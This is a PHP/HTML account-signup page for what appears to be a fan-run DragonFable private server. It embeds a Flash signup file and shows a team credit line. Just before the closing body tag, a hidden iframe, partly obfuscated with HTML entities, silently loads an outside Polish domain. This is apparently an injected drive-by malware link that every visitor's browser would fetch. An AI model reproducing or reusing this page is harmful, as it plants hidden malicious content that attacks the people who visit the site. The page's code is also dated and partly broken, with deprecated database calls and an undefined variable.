<?php
include ("includes/config.php");
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$signupSWF = $fetch['signupSWF'];
$sitename = $fetch['DFSitename'];
?>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title><?php echo $sitename; ?>: Create a Free Account!</title>
<link href="includes/DragonFable.css" rel="stylesheet" type="text/css">
</head>
<body>
<div align="center">
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" id="FFable" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" width="750" height="600" align="middle">
        <param name="allowScriptAccess" value="sameDomain" />
        <param name="movie" value="gamefiles/<?php echo $loaderSWF; ?>" />
        <param name="movie" value="flash/<?php echo $signupSWF; ?>" />
        <param name="menu" value="false" />
    <param name="allowFullScreen" value="true" />

        <param name="bgcolor" value="#000000" />
        <embed src="flash/<?php echo $signupSWF; ?>" name="FFable" bgcolor="#000000" menu="false"  allowFullScreen="true" width="750" height="600" align="middle" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" swLiveConnect="true" />
      </object>
  <br>
  <table width="750" border="0" cellspacing="0" cellpadding="0">
    <tr>
      <td class="tdtrim"><img src="images/clear.gif" width="1" height="1" alt="images/clear.gif"></td>
    </tr>
    <tr>
      <td class="tdbg"><img src="images/clear.gif" width="1" height="5" alt="images/clear.gif"></td>
    </tr>
    <tr>
    <br /><table width="<?php echo $width; ?>" border="0" cellpadding="0" cellspacing="0" bgcolor="#360000">
<tr bgcolor="#000000">
    <td style="color: #FFFFFF; font-family: Verdana; font-size: <?php echo $fontsize ?>px; text-align: center;">Created by MentalBlank, HellFireAE and the DFPS Team.</td>
</tr>
</table>
    </tr>
    <tr>
      <td class="tdbg"><img src="images/clear.gif" width="1" height="5" alt="images/clear.gif"></td>

    </tr>
    <tr>
      <td class="tdtrim"><img src="images/clear.gif" width="1" height="1" alt="images/clear.gif"></td>
    </tr>
  </table>
  <br>
</div>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>